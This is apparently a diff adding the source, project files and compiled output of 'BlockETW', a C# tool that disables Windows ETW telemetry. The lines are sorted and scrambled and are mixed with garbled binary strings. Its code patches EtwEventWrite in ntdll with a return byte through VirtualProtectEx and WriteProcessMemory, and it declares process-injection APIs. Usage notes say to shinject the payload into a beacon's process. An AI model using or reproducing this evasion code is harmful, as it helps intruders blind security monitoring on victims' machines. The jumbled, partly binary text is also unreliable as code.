@@ -1,0 +1,1643 @@
+            DUPLICATE_SAME_ACCESS = 0x00000002
+            IntPtr ApcArgument3)
+            IntPtr BaseAddress)
+            IntPtr hFile)
+            IntPtr lpBytesBuffer)
+            PAGE_WRITECOMBINE = 0x00000400
+            PROTECT_FROM_CLOSE = 2
+            Synchronize = 0x00100000
+            [MarshalAs(UnmanagedType.Bool)]
+            [MarshalAs(UnmanagedType.LPWStr)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            bool AllocateDestinationString)
+            internal CLIENT_ID ClientId
+            internal Int16 cbReserved2
+            internal Int16 wShowWindow
+            internal Int32 Length
+            internal Int32 cb
+            internal Int32 dwFillAttribute
+            internal Int32 dwFlags
+            internal Int32 dwX
+            internal Int32 dwXCountChars
+            internal Int32 dwXSize
+            internal Int32 dwY
+            internal Int32 dwYCountChars
+            internal Int32 dwYSize
+            internal IntPtr AffinityMask
+            internal IntPtr BasePriority
+            internal IntPtr Buffer
+            internal IntPtr ExitStatus
+            internal IntPtr InheritedFromUniqueProcessId
+            internal IntPtr ObjectName
+            internal IntPtr PebBaseAddress
+            internal IntPtr RootDirectory
+            internal IntPtr SecurityDescriptor
+            internal IntPtr SecurityQualityOfService
+            internal IntPtr TebBaseAddress
+            internal IntPtr UniqueProcess
+            internal IntPtr UniqueThread
+            internal IntPtr hProcess
+            internal IntPtr hStdError
+            internal IntPtr hStdInput
+            internal IntPtr hStdOutput
+            internal IntPtr hThread
+            internal IntPtr lpAttributeList
+            internal IntPtr lpReserved2
+            internal IntPtr lpSecurityDescriptor
+            internal STARTUPINFO StartupInfo
+            internal UInt16 Length
+            internal UInt16 MaximumLength
+            internal UInt32 ExitStatus
+            internal UIntPtr AffinityMask
+            internal UIntPtr UniqueProcessId
+            internal bool bInheritHandle
+            internal int BasePriority
+            internal int Priority
+            internal int dwProcessId
+            internal int dwThreadId
+            internal int nLength
+            internal static extern UInt32 LdrGetDllHandle(
+            internal static extern UInt32 LdrGetProcedureAddress(
+            internal static extern UInt32 NtAlertResumeThread(
+            internal static extern UInt32 NtCreateSection(
+            internal static extern UInt32 NtCreateThreadEx(
+            internal static extern UInt32 NtMapViewOfSection(
+            internal static extern UInt32 NtQueryInformationThread(
+            internal static extern UInt32 NtQueueApcThread(
+            internal static extern UInt32 ResumeThread(IntPtr hThread)
+            internal static extern UInt32 RtlUnicodeStringToAnsiString(
+            internal static extern bool CloseHandle(IntPtr hObject)
+            internal static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList)
+            internal static extern int GetConsoleOutputCP()
+            internal static extern void RtlInitUnicodeString(
+            internal string lpDesktop
+            internal string lpReserved
+            internal string lpTitle
+            internal uint Attributes
+            public static extern IntPtr LoadLibrary(string name)
+            public static extern UInt32 NtUnmapViewOfSection(
+            ref IntPtr DllHandle)
+            ref IntPtr FunctionAddress)
+            ref UInt32 PreviousSuspendCount)
+            ref int ReturnLength)
+            string SourceString)
+            uint Win32Protect)
+            var hProcess = Process.GetCurrentProcess().Handle
+            var hook = new byte[] { 0xc3 }
+        [Flags]
+        [StructLayout(LayoutKind.Sequential)]
+        internal class Kernel32
+        internal class Ntdll
+        internal class THREAD_BASIC_INFORMATION
+        internal enum AllocationProtect : uint
+        internal enum DuplicateOptions : uint
+        internal enum HANDLE_FLAGS : uint
+        internal enum ProcessAccessFlags : uint
+        internal struct ANSI_STRING
+        internal struct CLIENT_ID
+        internal struct OBJECT_ATTRIBUTES
+        internal struct PROCESS_BASIC_INFORMATION
+        internal struct PROCESS_INFORMATION
+        internal struct SECURITY_ATTRIBUTES
+        internal struct STARTUPINFO
+        internal struct STARTUPINFOEX
+        internal struct UNICODE_STRING
+        public static void Main(string[] args)
+        {
+        }
+      </requestedPrivileges>
+    </security>
+    </startup>
+    <AssemblyName>blocketw</AssemblyName>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>pdbonly</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <FileAlignment>512</FileAlignment>
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>Exe</OutputType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <ProjectGuid>{DAEDF7B3-8262-4892-ADC4-425DD5F85BCA}</ProjectGuid>
+    <RootNamespace>blocketw</RootNamespace>
+    <StartupObject />
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <WarningLevel>4</WarningLevel>
+    <security>
+    <startup> 
+    internal class RemoteExecution
+    internal class Win32
+    {
+    }
+  2020
+  </ItemGroup>
+  </PropertyGroup>
+  </trustInfo>
+  <ItemGroup>
+  <PropertyGroup>
+ BlockETW
+ EE]$
+ EHcHEH
+ EPE
+ MSF 7.00
+ O2TA'
+ Visual Studio Version 16
+ VnBv9<4aI4
+ uwx
+!'<zq
+!2IS}
+!:E}rI(-
+!DZN
+!I16guo
+!Microsoft.Build.Tasks.SystemState
+!vUA
+!y>/pg
+"            All = 0x001F0FFF,"
+"            CreateProcess = 0x000000080,"
+"            CreateThread = 0x00000002,"
+"            DUPLICATE_CLOSE_SOURCE = 0x00000001,"
+"            DuplicateHandle = 0x00000040,"
+"            INHERIT = 1,"
+"            IntPtr ApcArgument1,"
+"            IntPtr ApcArgument2,"
+"            IntPtr ApcRoutine,"
+"            IntPtr CommitSize,"
+"            IntPtr DllCharacteristics,"
+"            IntPtr DllPath,"
+"            IntPtr ObjectAttributes,"
+"            IntPtr ProcessHandle,"
+"            IntPtr SectionHandle,"
+"            IntPtr ThreadHandle,"
+"            IntPtr ThreadInformation,"
+"            IntPtr ZeroBits,"
+"            IntPtr hModule,"
+"            IntPtr lpParameter,"
+"            IntPtr lpStartAddress,"
+"            IntPtr pAttrs,"
+"            NONE = 0x00000000,"
+"            None = 0,"
+"            PAGE_EXECUTE = 0x00000010,"
+"            PAGE_EXECUTE_READ = 0x00000020,"
+"            PAGE_EXECUTE_READWRITE = 0x00000040,"
+"            PAGE_EXECUTE_WRITECOPY = 0x00000080,"
+"            PAGE_GUARD = 0x00000100,"
+"            PAGE_NOACCESS = 0x00000001,"
+"            PAGE_NOCACHE = 0x00000200,"
+"            PAGE_READONLY = 0x00000002,"
+"            PAGE_READWRITE = 0x00000004,"
+"            PAGE_WRITECOPY = 0x00000008,"
+"            QueryInformation = 0x00000400,"
+"            QueryLimitedInformation = 0x00001000,"
+"            SetInformation = 0x00000200,"
+"            SetQuota = 0x00000100,"
+"            Terminate = 0x00000001,"
+"            UInt32 DesiredAccess,"
+"            UInt32 Ordinal,"
+"            UInt32 SizeOfStackCommit,"
+"            UInt32 SizeOfStackReserve,"
+"            UInt32 StackZeroBits,"
+"            UInt32 desiredAccess,"
+"            VirtualMemoryOperation = 0x00000008,"
+"            VirtualMemoryRead = 0x00000010,"
+"            VirtualMemoryWrite = 0x00000020,"
+"            Win32.Kernel32.VirtualProtectEx(hProcess, address, (UIntPtr)hook.Length, 0x40, out uint oldProtect)"
+"            Win32.Kernel32.VirtualProtectEx(hProcess, address, (UIntPtr)hook.Length, oldProtect, out uint x)"
+"            Win32.Kernel32.WriteProcessMemory(hProcess, address, hook, hook.Length, out IntPtr bytesWritten)"
+"            [DllImport(""kernel32"")]"
+"            [DllImport(""kernel32.dll"")]"
+"            [DllImport(""kernel32.dll"", CharSet = CharSet.Auto, SetLastError = true)]"
+"            [DllImport(""kernel32.dll"", SetLastError = true)]"
+"            [DllImport(""ntdll.dll"")]"
+"            bool CreateSuspended,"
+"            int ThreadInformationClass,"
+"            int ThreadInformationLength,"
+"            internal static extern Boolean ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, UInt32 dwSize, ref UInt32 lpNumberOfBytesRead)"
+"            internal static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId)"
+"            internal static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect)"
+"            internal static extern UInt32 NtOpenProcess(ref IntPtr ProcessHandle, UInt32 DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId)"
+"            internal static extern UInt32 NtQueryInformationProcess(IntPtr processHandle, UInt32 processInformationClass, ref ulong processInformation, int processInformationLength, ref UInt32 returnLength)"
+"            internal static extern UInt32 RtlCreateProcessParametersEx(ref IntPtr pProcessParameters, IntPtr ImagePathName, IntPtr DllPath, IntPtr CurrentDirectory, IntPtr CommandLine, IntPtr Environment, IntPtr WindowTitle, IntPtr DesktopInfo, IntPtr ShellInfo, IntPtr RuntimeData, uint Flags)"
+"            internal static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize)"
+"            internal static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)"
+"            internal static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions)"
+"            internal static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize)"
+"            internal static extern bool PeekNamedPipe(IntPtr handle, IntPtr buffer, IntPtr nBufferSize, IntPtr bytesRead, ref uint bytesAvail, IntPtr BytesLeftThisMessage)"
+"            internal static extern bool QueryFullProcessImageName([In]IntPtr hProcess, [In]int dwFlags, [Out]StringBuilder lpExeName, ref int lpdwSize)"
+"            internal static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask, HANDLE_FLAGS dwFlags)"
+"            internal static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)"
+"            internal static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)"
+"            internal static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten)"
+"            internal static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds)"
+"            internal static extern void RtlZeroMemory(IntPtr pBuffer, int length)"
+"            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName)"
+"            ref ANSI_STRING DestinationString,"
+"            ref ANSI_STRING ModName,"
+"            ref IntPtr BaseAddress,"
+"            ref IntPtr hThread,"
+"            ref IntPtr section,"
+"            ref UNICODE_STRING DestinationString,"
+"            ref UNICODE_STRING DllName,"
+"            ref UNICODE_STRING SourceString,"
+"            ref long MaxSize,"
+"            ref long SectionOffset,"
+"            ref long ViewSize,"
+"            uint AllocationType,"
+"            uint InheritDisposition,"
+"            uint allocationAttribs,"
+"            uint pageProt,"
+"            var address = Win32.Kernel32.GetProcAddress(Win32.Kernel32.LoadLibrary(""ntdll.dll""), ""EtwEventWrite"")"
+"        <requestedExecutionLevel level=""asInvoker"" uiAccess=""false""/>"
+"        <supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.5"" />"
+"        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]"
+"        [StructLayout(LayoutKind.Sequential, Pack = 0)]"
+"      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">"
+"    <Compile Include=""Properties"
+"    <Compile Include=""remoteexec.cs"" />"
+"    <Compile Include=""win32.cs"" />"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <None Include=""App.config"" />"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <Reference Include=""Microsoft.CSharp"" />"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.Net.Http"" />"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"  2020"")]"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <PropertyGroup Condition="" '$(Configuration)"
+"  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>"
+"  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">"
+"!z""T"
+"""'WY"
+"""@-Ij@t "
+"""O/U8>"
+"""V[/U!J"
+"""]rQHm]pGAc5QAy"
+"""_BAV'"
+"""e{L"
+"""grC"
+"""imD9y1["
+"""usWCiZ"
+"""vm>"
+"""z)."
+"%q/5,Ba0-C"
+"(/"" d}V"
+")"">O"
+",32y"
+",3=>vOQ"
+",:,$:R"
+",<(E8e"
+",Microsoft.Build.Shared.AssemblyNameExtension"
+",dIv"
+"-O0ZkAO""74"
+".NETFramework,Version=v4.5"
+".NETFramework,Version=v4.5.AssemblyAttributes.cs"
+".NETFramework,v4.5,AssemblyFoldersEx}"
+".netframework,version=v4.5.assemblyattributes.cs"
+"// COM, set the ComVisible attribute to true on that type."
+"// [assembly: AssemblyVersion(""1.0."
+"/[hPhVu,"
+"1cKq3t""-"
+"20x,MS"
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Collections.Generic.List"
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]"
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]"
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]][]"
+"4CQh$"""
+"5Y,[N"
+"7-iUA""h"
+"7z,("
+"8%2""A%>Fl5"
+"8u""HE"
+"9G0R2"""
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
+"=,D/U"
+"@C,$"
+"AI!,=d"
+"AnyCPU' "">"
+"AssemblyInfo.cs"" />"
+"By""F7p["
+"D47DOT'""nC"
+"E, 0$)aQ"
+"EE@,@T"
+"Ey,(tN"
+"GcC,"
+"Gz3qM7}E"""
+"H(X,E"
+"I>YVnElHnt,HLM7"
+"ImZ""%"
+"J)]L3""vX"
+"Jv5EdJ,nfY"
+"K""10="
+"LeP,s-V"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.Build.Tasks.Core, Version=15.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"O_D@X,r"
+"P,@(D$"
+"P,@(M"
+"Project(""{2150E333-8FDC-42A3-9474-1A3956D46DE8}"") = ""Solution Items"", ""Solution Items"", ""{C5663DE9-FE2B-4AC3-B558-DB5493E2B013}"""
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""blocketw"", ""blocketw"
+"Q""l$B"
+"Sr,_"
+"T""7R:i"
+"T5 /Q@id(N"""
+"Uas,!/[@!3"
+"Uy1V""/O%}slsJg("
+"XE@,"
+"X_k"""
+"You must ""Self-Inject"" the blocketw.bin to the session that your beacon lives in"
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""blocketw"")]"
+"[assembly: AssemblyTitle(""blocketw"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""daedf7b3-8262-4892-adc4-425dd5f85bca"")]"
+"blocketw.csproj"", ""{DAEDF7B3-8262-4892-ADC4-425DD5F85BCA}"""
+"c""<l"
+"dG8""Q"
+"dMicrosoft.VisualStudio.CommonIDE, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
+"f]7u]d,"
+"g""Um"
+"h@E,"
+"hSW,"
+"ia_iJWo,O"
+"j,[H"
+"l0cg,'T"
+"l3,7"
+"m/jmrwG""Q2L"
+"m:S""g8"
+"nGM,"
+"oF'v,vG"
+"oYc""Ai'pK"
+"q@G,"
+"r%zZ-,("
+"t'E@,"
+"x""M@"
+"x7',"
+"x=c8/,6-@Ic"
+"xml version=""1.0"" encoding=""UTF-8"" standalone=""yes"""
+"xml version=""1.0"" encoding=""utf-8"" "
+"xml version=""1.0"" encoding=""utf-8"""
+"yk""X"
+$(1E1UE
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+$(dO
+$1E1UD$
+$8EE
+$9km[
+$HEHP
+$V76
+$br4
+$daedf7b3-8262-4892-adc4-425dd5f85bca
+$eE}
+$kttE
+$lnWA-
+$rR=
+$tkE
+$tq5>
+$trE
+%W/X45M<uD
+' as shown below:
+'(asb(2
+'D'20
+'RKA
+'UHEH
+'UQB)e(zh
+']JD%Q
+'d4UO
+(!E'
+(33)t
+(Oc dv
+(W-c
+(oZ}!}z
+)1]9
+)6ImxhcTv6[>js}O9R3thJm}
+)IkO
+)gjt0:
+)ytcz
+-AuX
+-HEH@(H@
+-HEHP]
+-N%D
+-jwt{n
+-z}q0@2H
+.(zq
+.Microsoft.Build.Shared.AssemblyNameExtension[]
+.NET Framework 4.5
+.NETFramework
+.Net 3.5 / 4.5 Assembly to block ETW telemetry in a process
+.O>Fp
+.bUT
+.ctor
+.dll
+.exe
+.j<S
+.jYPoZ
+.rsrc
+.text
+.winmd
+.x6H
+//      Build Number
+//      Major Version
+//      Minor Version
+//      Revision
+// General Information about an assembly is controlled through the following
+// Setting ComVisible to false makes the types in this assembly not visible
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// Version information for an assembly consists of the following four values:
+// You can specify all the values or you can default the Build and Revision Numbers
+// associated with an assembly.
+// by using the '
+// set of attributes. Change these attribute values to modify the information
+// to COM components.  If you need to access a type in this assembly from
+/DSkCV3hl
+/LinkInfo
+/Ovas/
+/Tl4PB0
+/luTK
+/names
+/sl_ES}>
+/src/files/c:
+/src/headerblock
+03k!qt[
+06000001
+0AAk:3-gt
+0Mff2x<
+0UVHBOrwU[
+0VR3]
+1.0.0.0
+1GGu[
+1[[System.Collections.Generic.KeyValuePair
+1uJAqFJ
+1{2xIZ
+223343bd-a859-41a3-90c0-9dfa101f1a95>
+2:</t
+2Bh)!X
+2RGS
+2S8)S
+39@H>g
+3:9Gx
+3EEE
+3]PzX9OhAX
+3ih!
+3za)
+3}3E
+4-Cn)qR35
+4/OtlA
+4SHd
+4_wb
+4aW)t
+4dH<
+4fQ>ac
+4h-7
+4u@5
+4z>v
+4}ct
+5'Drf
+54ybW5Yh6
+5System.Configuration.Assemblies.AssemblyHashAlgorithm
+5System.Configuration.Assemblies.AssemblyHashAlgorithm<System.Configuration.Assemblies.AssemblyVersionCompatibility
+5ZL1
+5ue!0r
+6A7<
+6AkOG/!S
+6Ddm
+6HP]
+6kj=Q
+6u>!
+7:Um
+7B7D23D6
+7FBDA2D2
+7UHEAH
+7X}w
+7dlxLb/=
+8!1[
+8Microsoft.VisualStudio.Build.ComInteropWrapper.RarInputs
+8P'$f]-f
+8V$2
+8__t(3
+8i) 
+8t HC
+8wor
+9!TV
+9([]
+9-taP
+9<z<
+9>Jp(315zlj
+9u>U
+:!:7
+:%d:
+:F H8d
+:t.d
+<$fC
+<%/4V1-X
+<)42E$
+<.t)
+</OutputPath>
+</Project>
+</assembly>
+</configuration>
+<0u=E
+<DanglingDocuments
+<FK3H
+<Module>
+<N=1
+<System.Configuration.Assemblies.AssemblyVersionCompatibility
+<Un8G7x07
+<configuration>
+<m:7
+<noB
+<udH
+=6viDX
+=K'AehT
+=TTLx]
+> shinject <pid> /opt/shellcode/blocketw.bin
+>!54a
+>=3)%>
+>D yV
+>Ub1
+>cr8m
+>ou6
+>rj!
+>x-4
+>xowo
+>}$ng(dW
+>}}i
+@ Hx
+@$Hx
+@(Hx
+@.reloc
+@<HcH
+@<HcHX
+@<HcHp
+@Bp[D
+@UUV
+@Yde
+@Yn3<
+@]zt
+@pD$
+@ppT$
+A 6WSt
+A-@Q
+A@}IRfRz: S
+AAQ:
+ANSI_STRING
+Adbs
+AffinityMask
+Agent.Execution
+Agent.Execution.RemoteExecution
+Agent.PInvoke
+AllocateDestinationString
+AllocationProtect
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+ApcArgument1
+ApcArgument2
+ApcArgument3
+ApcRoutine
+App.config
+AppData
+AssemblyCompanyAttribute
+AssemblyConfigurationAttribute
+AssemblyCopyrightAttribute
+AssemblyDescriptionAttribute
+AssemblyFileVersionAttribute
+AssemblyInfo.cs
+AssemblyProductAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+B  /B
+B6]kK
+BAL-q
+BQh-HB
+BSJB
+BasePriority
+Bb6q1x
+Bc.y
+BdQ}
+BgbyYLo
+Blob
+BtT[s8j
+Byte
+BytesLeftThisMessage
+B{Registry:Software
+C(E@
+C/=(p
+C4puB
+CENTER
+CGJ]
+CJhvP
+CLIENT_ID
+ClientId
+CloseHandle
+ComVisibleAttribute
+CommitSize
+CompilationRelaxationsAttribute
+Copyright 
+CreatePipe
+CreateProcess
+CreateSuspended
+CreateThread
+Credits go to RastaMouse and XPN for creating SharpC2 from which this tool is based
+DAkHAm
+DD$(H
+DE HE
+DE LM(HE
+DE LM(HE8
+DE LM(H}(
+DEULMHM
+DEULMHMHE
+DUPLICATE_CLOSE_SOURCE
+DUPLICATE_SAME_ACCESS
+Dc6M%n
+Debug
+DebuggableAttribute
+DebuggingModes
+DeleteProcThreadAttributeList
+Derek.Admin.STANN
+Derek.Admin.STANNCENTER
+DesignTimeResolveAssemblyReferences.cache
+DesktopInfo
+DllCharacteristics
+DllName
+DllPath
+DuplicateHandle
+DuplicateOptions
+E E@
+E PU uHE
+E)E(EH
+E.UE
+E0PU0u
+E<EH
+E<eH
+E@PEEP(E
+E@TD$
+E@xE}
+EA>2
+ED$$
+EE.E@
+EE@0E
+EE@0EE@
+EE@<
+EEED$
+EEEE
+EEEE@<
+EEEEEE
+EEH ]UHH0HM
+EEP E
+EE]U
+EEp9
+EEp9rdfE
+EExEE
+EH8[]USHXH$
+EHEH
+EHEHE
+EHMUu
+EHcHEH
+EIHeQ
+EP$E
+EP(E
+EUD$
+EUT$
+Eg32>e
+Eh6Du
+EndGlobal
+EndGlobalSection
+EndProject
+Enf-
+Enum
+EuEE
+EuNK8
+ExitStatus
+E}0t
+F!eHu
+FE(EE
+FF<pjpKnrs
+FY1H
+Facades
+Fhb!
+FileState
+Fl%jE
+FlagsAttribute
+For injecting into a process:  
+Framework
+FrameworkDisplayName
+FtCYC1./c7
+Full
+FunctionAddress
+FwRV
+G!H87R6e
+G!Jl
+GHm[d:wG%!e'eD
+GQe}f
+GUID
+GetConsoleOutputCP
+GetCurrentProcess
+GetProcAddress
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+GuidAttribute
+GxoY
+H ED$
+H HEHE
+H HEHU
+H ]UHH
+H ]UHH HM
+H ]UHHM
+H ]UHP
+H(HH
+H/NsCl
+H0]UH
+H0]UHH
+H0]UHHM
+H4E@
+H4aL
+H<{M
+H@ H
+H@ Ht(HE
+H@ LMLEHUHM
+H@(H
+H@(H@hU
+H@(Ht(HE
+H@0H
+H@0H(
+H@0HHHx
+H@0HU
+H@0HU HHh
+H@0HUHW
+H@0Ht(HE
+H@0Hu
+H@0IHH
+H@0PAL
+H@8H
+H@8HU
+H@8HUHh
+H@8Ht(HE
+H@@H
+H@D$
+H@HH
+H@HHp
+H@PH
+H@PHU
+H@PHp
+H@PHx
+H@XD
+H@XHU
+H@XHUHM
+H@]UHHM
+H@pH
+H@pHM
+H@pHU
+HANDLE_FLAGS
+HD$ 
+HD$(
+HD$8
+HD$@
+HD$H
+HE A
+HE H
+HE HU
+HE(H
+HE0HE0H@
+HE1HEH@0HM HU
+HEA@
+HEE 
+HEH@XH
+HEHE
+HEHEH
+HEHEH@
+HEHEH@0Ht
+HEHEH@XH@x
+HEHH
+HEHHEH)HHX[]UHH
+HEHHHEHHMH
+HEHP
+HEHU
+HEHUMHH
+HEHtvE
+HEH} 
+HEPH
+HEPHE@HE@H
+HEPHEHHEHH
+HEXHEXH@
+HEpHEpHP
+HExHEx@<HcH
+HHEH}
+HHEUT$
+HHEhH
+HHHX
+HHUH
+HIZ-
+HJ H
+HJ(H
+HJ(L
+HJ0H0
+HJ0HUHEPH}P
+HJ8H
+HJ8H0
+HJpH
+HK2C.D
+HM A
+HMHEH}
+HMHUHEHEHEHEE
+HP H
+HP HE
+HP HEH
+HP(H
+HP(HEH
+HP(Hp
+HP0H
+HP0HEH
+HP8H
+HP8HEH
+HP@H
+HP@HEH
+HPHH
+HPHHEH
+HPPH
+HPPHE@
+HPXH
+HPhH
+HPpH
+HPxH
+HR HHE
+HR(HHE
+HR0HHE
+HR8HHE
+HT$ AI
+HT$ MA
+HT$ MI
+HTHp
+HU HT$ AI
+HU(H
+HUH(HHEHP(HE(H
+HUH8
+HUH@
+HUHEHH1EHEA
+HUHEHKH1EE
+HUHH
+HUHM
+HUHMH
+HUHR8HHEHP8HE0H
+HUHUHJ
+HUIHH
+HUPHT$8HUHHT$0HU@HT$(HU8HT$ HU
+H]UHH0HM
+HashSize
+HideSolutionNode = FALSE
+HpHM A
+HpHm!
+Ht%HE
+Ht(HE
+HtDHE
+HtbH
+Hy0H
+Hy3H
+IDdw
+IF5N<J
+IIHHM
+INHERIT
+I]h'W
+Ilu/
+ImagePathName
+InheritDisposition
+InheritedFromUniqueProcessId
+InitializeProcThreadAttributeList
+IpO'R143
+It WILL NOT WORK if your using  spawnto
+IxDY
+J(-x(
+J6o@
+JX1X/
+Jfo0
+K.WiBYO
+K<o1
+K>7h
+K@Yc$
+KL<0
+KSsH
+KU{(9
+Kb>>
+KeOn}-
+Kernel32
+KeyComparer
+Keys
+L!This program cannot be run in DOS mode.
+L19E
+L4P.:(Mzh
+LB H
+LB(H
+LB0H
+LB8H
+LD$(LELD$ A
+LD$(T$ EL
+LD$0L
+LE DM(E0fEHE
+LE DM(HE
+LE DM(HE 
+LE DM(HE HEHE
+LE HE
+LE H} 
+LE LM(
+LE LM(HE0
+LHEHEH
+LM8DE(HU H ]UHH
+LdAEID!!h
+LdrGetDllHandle
+LdrGetProcedureAddress
+LoadFactor
+LoadLibrary
+Local
+LpH@
+LpqUS
+L}JK
+M L$
+M$L$
+M(L$
+M-2>
+MHEH
+MY4H9TM
+Main
+MaxSize
+MaximumLength
+Microsoft
+Microsoft C/C
+Microsoft.Build.Tasks.SystemState
+Microsoft.CSharp.dll
+MinimumVisualStudioVersion = 10.0.40219.1
+MnDq
+ModName
+MpE9
+Ms_.j
+Myzc
+MzclD
+N7D!kS
+NONE
+None
+Np7{
+NtAlertResumeThread
+NtCreateSection
+NtCreateThreadEx
+NtMapViewOfSection
+NtOpenProcess
+NtQueryInformationProcess
+NtQueryInformationThread
+NtQueueApcThread
+NtUnmapViewOfSection
+Nt[)y
+Ntdll
+N{hXtQ0zk]
+O'=)1
+O=R$<BI
+OBJECT_ATTRIBUTES
+OY>]D
+ObjectAttributes
+ObjectName
+Ordinal
+P4@0L$
+P4D$
+P8-S
+P<E@P
+P@D$
+PAGE_EXECUTE
+PAGE_EXECUTE_READ
+PAGE_EXECUTE_READWRITE
+PAGE_EXECUTE_WRITECOPY
+PAGE_GUARD
+PAGE_NOACCESS
+PAGE_NOCACHE
+PAGE_READONLY
+PAGE_READWRITE
+PAGE_WRITECOMBINE
+PAGE_WRITECOPY
+PDD$
+PHED$
+PL@HE
+PN(4
+PPD$
+PROCESS_BASIC_INFORMATION
